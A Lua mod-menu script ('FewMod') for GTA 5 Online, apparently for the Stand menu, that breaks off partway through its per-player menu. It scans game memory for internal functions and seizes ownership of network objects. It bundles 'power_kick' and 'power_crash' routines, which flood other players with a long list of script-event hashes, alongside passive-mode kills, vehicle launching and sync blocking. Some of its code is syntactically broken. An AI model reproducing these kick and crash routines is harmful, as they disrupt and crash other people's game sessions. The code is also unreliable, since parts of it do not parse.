--[[A Lot Was Taken From Other Scripts]]--
--[[Most Was Kept Original, Remade or Modified]]--
--[[Script Is Still A WIP So There May Be Minor Issues]]--

util.keep_running()
util.require_natives(1681379138) --Old 1676318796

local FewModConfigPath = filesystem.stand_dir() .. '\\Profiles\\'..'\\FewMod.txt'
local scriptconfigoptions = menu.list(menu.my_root(), "Config", {}, "")

menu.action(scriptconfigoptions, "Save Config", {"savesconfig"}, "Saves Your Config To A Specific Profile", function()
    menu.trigger_commands("saveFewMod")
end)

menu.action(scriptconfigoptions, "Load Config", {"loadsconfig"}, "Loads Your Config From A Specific Profile", function()
    menu.trigger_commands("loadFewMod")
end)

local response = false
local localversion = 1.68
local localKs = false
async_http.init("raw.githubusercontent.com", "/Fewdys/GTA5-FewMod-Lua/main/FewModVersion.lua", function(output)
    currentVer = tonumber(output)
    response = true
    if localversion ~= currentVer then
        util.toast("There is an update for FewMod available, use the Update Button to update it.")
        menu.action(menu.my_root(), "Update Script", {}, "This Should Only Appear If The Script Is Not Up To Date\nGrabs The Newest Version Of Script From The Following Link:\nhttps://github.com/Fewdys/GTA5-FewMod-Lua\n(Ignore If Already Updated)", function()
            async_http.init('raw.githubusercontent.com', '/Fewdys/GTA5-FewMod-Lua/main/Few.lua', function(u)
                util.yield_once()
                local err = select(2,load(u))
                if err then
                    util.toast("There was a issue updating FewMod, please update it manually from github.")
                    util.log("There was a issue updating FewMod, please update it manually from github.")
                    util.toast("Link: https://github.com/Fewdys/GTA5-FewMod-Lua")
                    util.log("Link: https://github.com/Fewdys/GTA5-FewMod-Lua")
                return end
                local f = io.open(filesystem.scripts_dir()..SCRIPT_RELPATH, "wb")
                f:write(u)
                f:close()
                util.toast("FewMod Updated Successfully. Restarting Script")
                util.log("FewMod Updated Successfully. Restarting Script")
                util.restart_script()
            end)
            async_http.dispatch()
        end)
    end
end, function() response = true end)
async_http.dispatch()
repeat 
    util.yield()
until response

local pos = players.get_position(players.user())
local changed_pos = pos;
local aim_only, aim_only_fake_lag, aim_rand = false, false, false;
local x_off, y_off = 0, 0;
local fakelag_ms = 0;
local radius = 5
local interval = 5000
local debug = false;
local path = menu.ref_by_path("Online>Spoofing>Position Spoofing")
--local protecc = menu.ref_by_path("Online>Protections")
local uwuself = menu.ref_by_path("Self")
local uwuonline = menu.ref_by_path("Online")
local uwuvehicle = menu.ref_by_path("Vehicle")
local uwuworld = menu.ref_by_path("World")
local uwustand = menu.ref_by_path("Stand")
local beacon = false;

local filename = "position_data.lua"
local path6 = filesystem.store_dir() .. filename

local file = io.open(path6, "r")
local positionsData = {}
local spriteTable = {}
local listData = {}
local bookmarksData = {}
local configData = {}

local createdBookmarks = {}
local bookmarksForBlips = {}

local defaultColor = 5
local defaultSprite = 1
local defaulScale = 7.000000

local spawned_objects = {}
local ladder_objects = {}
local int_min = -2147483647
local int_max = 2147483647
local skybase = {}

local wallbr = util.joaat("bkr_prop_biker_bblock_mdm3")
local floorbr = util.joaat("bkr_prop_biker_landing_zone_01")
local invites = {"Yacht", "Office", "Clubhouse", "Office Garage", "Custom Auto Shop", "Apartment"}
local style_names = {"Normal", "Semi-Rushed", "Reverse", "Ignore Lights", "Avoid Traffic", "Avoid Traffic Extremely", "Sometimes Overtake Traffic"}
local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}

util.toast("Welcome " .. SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME())

util.toast("Loading FewMod...")
util.log("Loading FewMod...")
menu.trigger_commands("allguns")
util.yield(2150)


-- Memory Functions

local orgScan = memory.scan
function myModule(name, pattern, callback)
    local address = orgScan(pattern)
    if address ~= NULL then
        util.log("Found " .. name)
        callback(address)
    else
        util.log("Not Found " .. name)
        util.stop_script()
    end
end

---@param entity Entity
---@return integer
function get_net_obj(entity)
    local pEntity = entities.handle_to_pointer(entity)
    return pEntity ~= NULL and memory.read_long(pEntity + 0x00D0) or NULL
end

function UnregisterNetworkObject(object, reason, force1, force2)
	local netObj = get_net_obj(object)
	if netObj == NULL then
		return false
	end
	local net_object_mgr = memory.read_long(CNetworkObjectMgr)
	if net_object_mgr == NULL then
		return false
	end
	util.call_foreign_function(UnregisterNetworkObject_addr, net_object_mgr, netObj, reason, force1, force2)
	return true
end

function getModelInfo(modelHash)
	return util.call_foreign_function(p_getModelInfo, modelHash, NULL)
end

function getVehicleModelHandlingData(modelInfo)
	return util.call_foreign_function(GetHandlingDataFromIndex, memory.read_uint(modelInfo + 0x4B8))
end

p_getModelInfo = 0
myModule("GVMI", "48 89 5C 24 ? 57 48 83 EC 20 8B 8A ? ? ? ? 48 8B DA", function (address)
	p_getModelInfo = memory.rip(address + 0x2A)
end)


GetHandlingDataFromIndex = 0
myModule("GHDFI", "40 53 48 83 EC 30 48 8D 54 24 ? 0F 29 74 24 ?", function (address)
	GetHandlingDataFromIndex = memory.rip(address + 0x37)
end)

myModule("GetNetGamePlayer", "48 83 EC ? 33 C0 38 05 ? ? ? ? 74 ? 83 F9", function (address)
    GetNetGamePlayer_addr = address
end)

myModule("NetworkObjectMgr", "48 8B 0D ? ? ? ? 45 33 C0 E8 ? ? ? ? 33 FF 4C 8B F0", function (address)
    CNetworkObjectMgr = memory.rip(address + 3)
end)

myModule("ChangeNetObjOwner", "48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 41 54 41 56 41 57 48 81 EC ? ? ? ? 44 8A 62 4B", function (address)
    ChangeNetObjOwner_addr = address
end)

myModule("UnregisterNetworkObject", "48 89 70 ? 48 89 78 ? 41 54 41 56 41 57 48 83 ec ? 80 7a ? ? 45 8a f9", function (address)
	UnregisterNetworkObject_addr = address - 0xB
end)

---@param player integer
---@return integer
function GetNetGamePlayer(player)
    return util.call_foreign_function(GetNetGamePlayer_addr, player)
end

local function GetNetworkId(player_id)
    return ReadInt(ScriptGlobal(2657589 + 1 + (player_id * 466) + 38))
end

local function SetNetworkId(player_id, net_id)
    WriteInt(ScriptGlobal(2657589 + 1 + (player_id * 466) + 38), net_id)
end

local function GetVehicleFromNetId(player_id)
    return NetToVeh(GetNetworkId(player_id))
end

local function world_to_screen(pos)
    if GetScreenCoordFromWorldCoord(pos.x, pos.y, pos.z, sx_ptr, sy_ptr) then
        local sx, sy = ReadFloat(sx_ptr), ReadFloat(sy_ptr)
        return {x = sx, y = sy}
    end
end

local function bone_within_bounds(ped, bone, bounds, fov)
    local bone_coords = GetPedBoneCoords(ped, bone, 0.0, 0.0, 0.0)
    local world_coords = world_to_screen(bone_coords)
    bone_coords.z = bone_coords.z + 0.15
    
    if world_coords ~= nil then
        local x1, y1 = world_coords.x, world_coords.y
        local x2, y2 = bounds.x, bounds.y
        local dist = math.sqrt((x2 - x1) ^ 2 + (y2 - y1) ^ 2)

        if dist <= fov / 180 then
            return true
        else
            return false
        end
    end
end

menu.divider(uwuself, "Lua Shit")
menu.divider(uwuvehicle, "Lua Shit")
menu.divider(uwuonline, "Lua Shit")
--menu.divider(protecc, "Lua Shit")
menu.divider(uwuworld, "Lua Shit")
menu.divider(uwustand, "Lua Shit")

-- Few Functions
Fewd = {
    int = function(global, value)
        local radress = memory.script_global(global)
        memory.write_int(radress, value)
    end,

    request_model_load = function(hash)
        request_time = os.time()
        if not STREAMING.IS_MODEL_VALID(hash) then
            return
        end
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            if os.time() - request_time >= 10 then
                break
            end
            util.yield()
        end
    end,

    modded_vehicles = {
        "dune2",
        "tractor",
        "tractor2",
        "tractor3",
        "emperor3",
        "asea2",
        "mesa2",
        "jet",
        "policeold1",
        "policeold2",
        "armytrailer2",
        "towtruck",
        "towtruck2",
        "cargoplane",
        "eudora",
        "manchez3",
        "panthere2",
        "baletrailer",
        "bulldozer",
        "burrito5",
        "cablecar",
        "bruiser",
        "bruiser2",
        "bruiser3",
        "dune2",
        "monster3",
        "monster4",
        "monster5",
        "rancherxl2",
        "zhoba",
        "emporor3",
        "sadler2",
        "stockade3",
        "issi4",
        "issi5",
        "issi6",
        "ruiner3",
        "tampa3",
        "fib",
        "fib2",
        "police",
        "police2",
        "police3",
        "police4",
        "policeb",
        "police",
        "policet",
        "pranger",
        "riot",
        "sheriff",
        "sheriff2",
        "cablecar",
        "freight",
        "metrotrain",
        "blimp",
        "blimp2",
        "blimp3",
        "seasparrow",
        "skylift",
        "avenger",
        "avenger2",
        "microlight",
        "tula",
        "valatol",
        "cargoplane2",
        "howard",
        "miljet",
        "seabreeze",
        "starling",
        "velum2",
        "cutter",
        "mixer2",
        "rubble",
        "handler",
        "cutter",
        "submersible",
        "avisa",
        "losatka",
        "patrolboat",
        "predator",
        "benson",
        "biff",
        "hauler",
        "hauler2",
        "packer",
        "phantom",
        "pounder",
        "stockade3",
        "dilettante2",
    },

    --[[street_vehicles = {
        "prairie",
        "tiptruck2",
        "tiptruck",
        "flatbed",
        "bodhi2",
        "duneloader",
        "mesa3",
        "cavalcade",
        "cavalcade2",
        "dubsta",
        "dubsta2",
        "emperor",
        "emperor2",
        "glendale",
        "glendale2",
        "tailgater",
        "rhinehart",
    },]]

    KJFNkjfjkFKJ = function(player_id)
        players.get_rockstar_id(player_id)
    end,

    modded_weapons = {
        "weapon_railgun",
        "weapon_stungun",
        "weapon_digiscanner",
        "weapon_pistolxm3", -- wm29pistol
        "weapon_fertilizercan",
        "weapon_hazardcan",
        "weapon_acidpackage",
        "weapon_ball",
        "weapon_bzgas",
        "weapon_fireextinguisher",
        "weapon_ceramicpistol",
        "weapon_poolcue",
        "weapon_snowball",
    },

    get_spawn_state = function(player_id)
        return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 232)) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_232
    end,

    get_interior_of_player = function(player_id)
        return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 245))
    end,

    is_player_in_interior = function(player_id)
        return (memory.read_int(memory.script_global(2657589 + 1 + (player_id * 466) + 245)) ~= 0)
    end,

    get_random_pos_on_radius = function()
        local angle = random_float(0, 2 * math.pi)
        pos = v3.new(pos.x + math.cos(angle) * radius, pos.y + math.sin(angle) * radius, pos.z)
        return pos
    end,

    get_transition_state = function(player_id)
        return memory.read_int(memory.script_global(((0x2908D3 + 1) + (player_id * 0x1C5)) + 230))
    end,

    get_interior_player_is_in = function(player_id)
        return memory.read_int(memory.script_global(((2657589 + 1) + (player_id * 466)) + 245))
    end,

    ChangeNetObjOwner = function(object, player)
        if NETWORK.NETWORK_IS_IN_SESSION() then
            local net_object_mgr = memory.read_long(CNetworkObjectMgr)
            if net_object_mgr == NULL then
                return false
            end
            if not ENTITY.DOES_ENTITY_EXIST(object) then
                return false
            end
            local netObj = get_net_obj(object)
            if netObj == NULL then
                return false
            end
            local net_game_player = GetNetGamePlayer(player)
            if net_game_player == NULL then
                return false
            end
            util.call_foreign_function(ChangeNetObjOwner_addr, net_object_mgr, netObj, net_game_player, 0)
            return true
        else
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            return true
        end
    end,

    anim_request = function(hash)
        STREAMING.REQUEST_ANIM_DICT(hash)
        while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
            util.yield()
        end
    end,

    get_control_request = function(ent)
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            local tick = 0
            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
                tick = tick + 1
                util.yield()
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            end
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            util.toast("Couldn't Get Control Of "..ent)
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end,

    rotation_to_direction = function(rotation)
        local adjusted_rotation = 
        { 
            x = (math.pi / 180) * rotation.x, 
            y = (math.pi / 180) * rotation.y, 
            z = (math.pi / 180) * rotation.z 
        }
        local direction = 
        {
            x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
            y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
            z =  math.sin(adjusted_rotation.x)
        }
        return direction
    end,

    request_model = function(hash, timeout)
        timeout = timeout or 3
        STREAMING.REQUEST_MODEL(hash)
        local end_time = os.time() + timeout
        repeat
            util.yield()
        until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
        return STREAMING.HAS_MODEL_LOADED(hash)
    end,

    BlockSyncs = function(player_id, callback)
        for _, i in ipairs(players.list(false, true, true)) do
            if i ~= player_id then
                local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                menu.trigger_command(outSync, "on")
            end
        end
        util.yield(10)
        callback()
        for _, i in ipairs(players.list(false, true, true)) do
            if i ~= player_id then
                local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                menu.trigger_command(outSync, "off")
            end
        end
    end,

    disable_traffic = true,
    disable_peds = true,
    pwayer = players.user_ped(),

    maxTimeBetweenPress = 300,
    pressedT = util.current_time_millis(),
    Int_PTR = memory.alloc_int(),
    mpChar = util.joaat("mpply_last_mp_char"),

    getMPX = function()
        STATS.STAT_GET_INT(util.mpChar, util.Int_PTR, -1)
        return memory.read_int(util.Int_PTR) == 0 and "MP0_" or "MP1_"
    end,

    STAT_GET_INT = function(Stat)
        STATS.STAT_GET_INT(util.joaat(util.getMPX() .. Stat), util.Int_PTR, -1)
        return memory.read_int(util.Int_PTR)
    end,

    local kicks = {
        0x493fc6bb,
        1228916411,
        1256866538,
        -1753084819,
        1119864805,
        -1813981910,
        -892744477,
        -859672259,
        -898207315,
        548471420,
        -30654421,
        -2113865699,
        1681920018,
        1096448327,
        113023613,
        42967925,
        1746765664,
        538193013,
        1163337421,
        1110452930,
        -596760615,
        -140109523,
        1398154308,
        181375724,
        672437644,
        -1765092612,
        -338166051,
        2100923829,
        -1822401313,
        1242664595,
        -1962062913,
        -2085699648,
        -1185502051,
        -193885642,
        1401157001,
        -459327862,
        -2001677186,
        -419652151,
        85920017,
        -1891171016,
        1227699211,
        414506075,
        1519903406,
        871267300,
        -2029579257,
        -1453392398,
        1192608757,
        2067191610,
        1694464420,
        -1518599654,
        1397900875,
        -1548871816,
        -852914485,
        -333917558,
        -644115601,
        1875524648,
        1765085190,
        -91833327,
        886761285,
        1900384925,
        -1328646658,
        134199208,
        -1392241127,
        -795380017,
        1804829460,
        1370461707,
        1813766002,
        -964882004,
        2080651008,
        -860929776,
        1999063780,
        1456052554,
        1167971813,
        -1963501380,
        -162943635,
        -1047334626,
        -580709734,
        448968075,
        -672300651,
        1009548335,
        2034045540,
        217196385,
        1607508898,
        1368347173,
        1772461754,
        -492741651,
        -1230153214,
        2092740896,
        -876146989,
        477242315,
        1903858674,
        1128918904,
        -519597839,
        1077951879,
        285546291,
        857538507,
        -328486618,
        2118577282,
        1810679938,
        -1322082704,
        518811989,
        -1578682814,
        1807254743,
        2144693378,
        1200439149,
        -513394492,
        2041060862,
        -1472351847,
        -484141204,
        -141450727,
        -1575137150,
        854806881,
        -839043921,
        -2105209800,
        -1001891935,
        -1593201907,
        -851885842,
        -970362313,
        -382052039,
        -871545888,
        2060563275,
        309814753,
        -285454749,
        755923450,
        1304332204,
        -381818092,
        1819411281,
        1250480109,
        -766974585,
        1264221127,
        1541446437,
        -2044863341,
        -1424012222,
        -1127353498,
        2005059642,
        167413139,
        669039275,
        -507112185,
        -1479027099,
        -1090858280,
        186548319,
        -1878484856,
        -16793987,
        1322812076,
        898343266,
        -438023591,
        -2048374263,
        -1609136786,
        434570842,
        937151636,
        1272793301,
        988586503,
        -1173163558,
        -1714789749,
        1589823260,
        -23082252,
        1041200857,
        -1555358611,
        127955867,
        375962343,
        1001517091,
        1345672987,
        -1168208444,
        -730912208,
        2084633812,
        792153085,
        1473913668,
        -343495611,
        1491806827,
        1039282949,
        -1460955723,
        317177044,
        -1834446996,
        1552900972,
        -2028335784,
        -241418449,
        -1653861842,
        -259156293,
        1594928808,
        -1556962447,
        1640286562,
        -1139254401,
        -949018811,
        1803131174,
        -71273283,
        -119249570,
        -53458173,
        -1003348271,
        -1123400822,
        1772495870,
        -1701192924,
        -1218087738,
        -10982782,
        814496833,
        -1094380288,
        319685114,
        -323171360,
        820416549,
        1835182208,
        337732417,
        -124020592,
        1221375594,
        2144481042,
        -749491288,
        -882028108,
        -1370028781,
        -1261736727,
        1037705593,
        1377857852,
        1168623138,
        -310617732,
        908767058,
        1409556665,
        -1387723751,
        -1492841786,
        1674476795,
        232443159,
        178524407,
        986260144,
        653628905,
        -168599209,
        474413179,
        -2051844999,
        1560973005,
        -904555865,
        879177392,
        -2060526162,
        -994591791,
        388881138,
        1674317759,
        1486774330,
        489739448,
        -398684455,
        -841455067,
        1379379239,
        2046296859,
        1311159119,
        -760942281,
        -1831959078,
        1848110702,
        -364713137,
        -1643482755,
        -1464365333,
        1327169001,
        1620260542,
        245065909,
        -1597942809,
        1071490035,
        1920583171,
        265836764,
        1303606785,
        267489225,
        1569236577,
        -469493996,
        360244585,
        1134514966,
        -2139562045,
        279717272,
        10138018,
        -725780952,
        396538098,
        -1029914669,
        -1296375264,
        -805921310,
        -468188833,
        1923972962,
        -444617715,
        -248680084,
        -1419450740,
        1279059857,
        -150763833,
        -720665383,
        -278036454,
        -1389482213,
        -1954654708,
        -204643402,
        -1496673706,
        1292306623,
        1950531948,
        -1990614866,
        1124104301,
        -646004404,
        -1216295492,
        -859612223,
        -1781653678,
        1083015459,
        -933673939,
        434937615,
        -957260626,
        -975458684,
        -1640403704,
        -1322731185,
        -1129868216,
        316066012,
        1454834612,
        700267046,
        -1730284249,
        1074803562,
        178476176,
        -509252369,
        1304577008,
        -102043551,
        -1526561203,
        -1612608404,
        895397362,
        1802646519,
        1268038438,
        1927489513,
        1046014587,
        549145155,
        -1237225255,
        1500075603,
        81880333,
        -1484508675,
        -2059117919,
        1332590686,
        -910497748,
        -1141914502,
        -1582289420,
        -76043076,
        2144523214,
        243072129,
        2064487849,
        435675531,
        -500923695,
        1336084487,
        323981539,
        567662973,
        -1571441360,
        -1054040893,
        843316754,
        169410705,
        491906476,
        796658339,
        974054812,
        508339812,
        431653434,
        1341265547,
        -1168222636,
        -715264067,
        1121720242,
        931417473,
        -583098065,
        1586286277,
        -1330848029,
        -1448015548,
        561154955,
        -1471373324,
        1306214888,
        -91898414,
        90440793,
        914476312,
        815640525,
        -394088790,
        1858712297,
        -1743542712,
        49863291,
        1025036241,
        -508465573,
        1810531023,
        2119903152,
        507886635,
        -1057685265,
        915462795,
        -1069140561,
        1491410017,
        -1601139550,
        -290401917,
        -1357080740,
        -299190545,
        -1443768844,
        1354970087,
        1796894334,
        392606458,
        697566862,
        1402665684,
        -1694531511,
        393633835,
        1292973690,
        1605689751,
        1883636994,
        1814318034,
        -50961790,
        -93722397,
        1775863255,
        125899875,
        -1217949151,
    }

    power_kick = function(player_id)
        for i, v in pairs(Fewd.kicks) do
            arg1 = math.random(-2147483647, 2147483647)
            arg2 = math.random(-1987543, 1987543)
            arg3 = math.random(-19, 19)
            util.trigger_script_event(1 << player_id, {v, player_id, arg1, arg3, arg2, arg2, arg1, arg1, arg3, arg3, arg1, arg3, arg2, arg3, arg1, arg1, arg2, arg3, arg1, arg2, arg2, arg3, arg3})
        end
        util.toast("You kicked " .. PLAYER.GET_PLAYER_NAME(player_id))
    end,

    power_crash = function(player_id)
        for i, v in pairs(Fewd.kicks) do
            arg1 = math.random(-2147483647, 2147483647)
            arg2 = math.random(-1987543, 1987543)
            arg3 = math.random(-19, 19)
            util.trigger_script_event(1 << player_id, {v, player_id, arg1, arg3, arg2, arg2, arg1, arg1, arg3, arg3, arg1, arg3, arg2, arg3, arg1, arg1, arg2, arg3, arg1, arg2, arg2, arg3, arg3})
        end
        util.toast("You crashed " .. PLAYER.GET_PLAYER_NAME(player_id))
    end
}

request_model = function(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end

-- Local general script functions
function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = util.rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, -
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            -1, 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    memory.free(ptr1)
    memory.free(ptr2)
    memory.free(ptr3)
    memory.free(ptr4)
    return {p1, p2, p3, p4}
end
function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = Fewd.rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    return destination
end

function direction()
    local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
    local res = raycast_gameplay_cam(-1, 1000)
    local c2

    if res[1] ~= 0 then
        c2 = res[2]
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end

    c2.x = (c2.x - c1.x) * 1000
    c2.y = (c2.y - c1.y) * 1000
    c2.z = (c2.z - c1.z) * 1000
    return c2, c1
end
clear_radius = 10000
function clear_area(clear_radius)
    target_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    MISC.CLEAR_AREA(target_pos['x'], target_pos['y'], target_pos['z'], clear_radius, true, true, true, true)
end

local function request_ptfx_asset(asset)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        util.yield()
    end
end
local function kick_player_out_of_veh(player_id)
    local max_time = os.millis() + 1000
    local player_ped  = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local kick_vehicle_command_ref = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Kick From Vehicle")
    menu.trigger_command(kick_vehicle_command_ref)

    while PED.IS_PED_IN_ANY_VEHICLE(player_ped) do
        if os.millis() >= max_time then
            break
        end

        util.yield()
    end
end

local function player_toggle_loop(root, player_id, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(player_id) then util.stop_thread() end
        callback()
    end)
end

local function get_blip_coords(blipId)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(blipId)
    if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
    return v3(0, 0, 0)
end

local function PM(player_id, message)
    menu.trigger_commands("sendpm"..PLAYER.GET_PLAYER_NAME(player_id).." "..message)
end

function randomObjectFromTable(t)
    return t[math.random(1, #t)]
end

function RequestControl(entity)
    local tick = 0
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
        util.yield()
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
        tick = tick + 1
    end
end

function is_ped_player(ped)
    if PED.GET_PED_TYPE(ped) >= 4 then
        return false
    else
        return true
    end
end

local function load_weapon_asset(hash)
    while not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) do
        WEAPON.REQUEST_WEAPON_ASSET(hash)
        util.yield(50)
    end
end

local function passive_mode_kill(player_id)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local hash = 0x787F0BB

    local audible = true
    local visible = true

    request_model(hash)
    load_weapon_asset(hash)
    
    for i = 0, 50 do
        if PLAYER.IS_PLAYER_DEAD(player_id) then
            util.toast("Successfully Killed " .. players.get_name(player_id))
            return
        end

        local coords = ENTITY.GET_ENTITY_COORDS(ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z - 2, 100, 0, hash, 0, audible, not visible, 2500)
    end

    util.toast("Could Not Kill " .. players.get_name(player_id) .. ". \nPlayer Either Can't Be Ragdolled Or Is In GodMode")
end

local function send_player_vehicle_flying(player_id)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)

    if vehicle == 0 then
        return
    end

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 100, 40, true, true, true, true)
end

function EatMyShorts(player_id)
    for i, v in pairs(useforce) do
        request_stream_of_entity(v, 1)
    end
    for i = 1, 2 do
        local coords = player_coords(player_id)
        coords.x = coords.x
        coords.y = coords.y + -30
        coords.z = coords.z
        vehicle1 = entities.create_vehicle(184361638, coords, 0.0)
        object = entities.create_object(1890640474, coords, 0.0)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle1, true, true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, true, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
        ENTITY.SET_ENTITY_VISIBLE(object, true, 0)
        ENTITY.SET_ENTITY_VELOCITY(vehicle1, 5, 3, 3)
        ENTITY.SET_ENTITY_VELOCITY(object, 3, 4, 5)
        ENTITY.SET_ENTITY_ROTATION(object, math.random(0, 360), math.random(0, 360), math.random(0, 360), 0, true)
        for i = 1, 3 do
            ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, object, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            local vehicle2 = entities.create_vehicle(868868440, coords, 0.0)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle2, true, true)
            local ent_coords = ENTITY.GET_ENTITY_COORDS(object, true)
            FIRE.ADD_EXPLOSION(ent_coords.x, ent_coords.y, ent_coords.z, 0, 1.0, false, true, 0.0, false)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle2, 1, 0, -100, 0, true, false, true)
            ENTITY.SET_ENTITY_VISIBLE(vehicle2, true, 0)
            util.yield(300)
            ENTITY.DETACH_ENTITY(vehicle1, object)
        end
    end
end

players.on_join(function(player_id)

    menu.divider(menu.player_root(player_id), "Lua Shit")

    local Few = menu.list(menu.player_root(player_id), "FewMod")
    local malicious = menu.list(Few, "Malicious")
    local trolling = menu.list(Few, "Troll")
    local friendly = menu.list(Few, "Friendly")
    local vehicle = menu.list(Few, "Vehicle")
    local attachc = menu.list(Few, "Player Attach")

    menu.action(Few, "Send Private Chat Message", {"PM"}, "Sends Message To This Player Only", 
    function (click_type)
        menu.show_command_box_click_based(click_type, "PM" .. PLAYER.GET_PLAYER_NAME(player_id) .. " ")
    end,
    function (txt)
        local from = players.user()
        local me = players.user()
        local message = txt
        PM(player_id, message)
    end
    )

menu.action(Few, "Block Player / Player Join", {"block"}, "Shortcut to Blocking The Player Join Reaction", function()
    if player_id ~= players.user() then
        menu.trigger_commands("historyadd "..PLAYER.GET_PLAYER_NAME(player_id))
        menu.trigger_commands("historyblock" .. PLAYER.GET_PLAYER_NAME(player_id))
        util.toast("You Will Now Be Blocking "..PLAYER.GET_PLAYER_NAME(player_id).."'s Join \n(Or Have Unblocked There Join)")
        util.log("You Will Now Be Blocking "..PLAYER.GET_PLAYER_NAME(player_id).."'s Join \n(Or Have Unblocked There Join)")
    else
        util.toast("You Cant Block Yourself Silly <3")
    end
end)

menu.action(Few, "Find In Player History", {""}, "Shortcut to Player History For The Player", function()
    if player_id ~= players.user() then
        menu.trigger_commands("historyadd "..PLAYER.GET_PLAYER_NAME(player_id))
        menu.trigger_commands("findplayer "..PLAYER.GET_PLAYER_NAME(player_id))
    else
        menu.trigger_commands("historyadd "..PLAYER.GET_PLAYER_NAME(player_id))
        util.toast("This Is Yourself Just So You Know \nIf Your Spoofing Your Name It Likely Wont Be Able To Find You")
        menu.trigger_commands("findplayer "..PLAYER.GET_PLAYER_NAME(player_id))
    end
end)

    menu.action(menu.player_root(player_id), "Smart Kick", {}, "Stand's Smart Kick", function()
        menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(player_id))
    end)

    menu.action(menu.player_root(player_id), "Pool's Closed Kick", {}, "Stand's Pool's Closed Kick", function()
        menu.trigger_commands("aids"..PLAYER.GET_PLAYER_NAME(player_id))
    end)

    menu.action(menu.player_root(player_id), "Love Letter Kick", {}, "Stand's Love Letter Kick (Discrete Kick)", function()
        menu.trigger_commands("loveletterkick"..PLAYER.GET_PLAYER_NAME(player_id))
    end)

    menu.action(menu.player_root(player_id), "Blacklist Kick", {}, "Stand's Blacklist Kick", function()
